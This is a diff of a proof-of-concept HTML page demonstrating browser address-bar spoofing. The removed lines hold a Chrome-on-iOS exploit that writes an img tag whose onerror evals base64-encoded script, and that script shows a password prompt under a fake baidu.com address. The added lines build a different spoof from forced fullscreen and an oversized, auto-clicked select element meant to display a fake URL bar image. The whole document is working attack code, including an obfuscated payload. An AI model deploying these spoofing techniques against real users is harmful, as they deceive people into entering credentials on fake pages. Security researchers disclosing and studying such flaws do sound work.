@@ -1,23 +1,96 @@
+
+
+
+<!DOCTYPE html>
 <html>
-	<head>
-	    <title>Chrome URL spoofing vulnerability on IOS</title>
-	    <!--
-	        author: evi1m0.bat[at]gmail.com
-	        datetime: 2018/05/03 00:16:27
-	        test version: for iPhone 66.0.3359.122
-	    -->
-	</head>
-	<script>
-	    pwn = () => {
-	        x = open('', 'win');
-	        setTimeout(`
-	            x.document.write('<img src=@ onerror=eval(atob("dmFyIHB3ZD1wcm9tcHQoImh0dHBzOi8vdGVzdC5iYWlkdS5jb21cbmlucHV0IHlvdXIgcGFzc3dvcmRcbnRlc3QuLi4iKTtpZihwd2Qpe2FsZXJ0KCJwYXNzd29yZDogIitwd2QpfQ=="))><h2>Chrome URL spoofing vulnerability on IOS</h2>');
-	            `, 1000);
-	        setTimeout(`
-	            `, 2300);
-	    }
+<head>
+
+<style type="text/css">
+
+body {
+  overflow-x:hidden;
+  overflow-y:hidden;
+  margin: 0;
+  padding: 0;
+}
+
+select { width:100%; height:1489px; }
+
+</style>
+	
+</head>
+		<script>
+		function start(){
+			
+			var x = document.getElementById('fwiw');
+			x.click();
+			
+			}
+		
 	</script>
-	<h1>
-	    <a onclick="pwn()">ClickMe :-)</a>
-	</h1>
-	</html>
+	
+<input type="button" value="Click here first" onclick="document.documentElement.webkitRequestFullscreen();" id="foo">
+<body>
+  <select id="fwiw" style="display=none;" onclick="document.documentElement.webkitRequestFullscreen();">
+    <option>Image of spoofed URL bar goes here Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option selected>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+    <option>Image of spoofed URL bar goes here
+  </select>
+
+</body>
+</html>
+
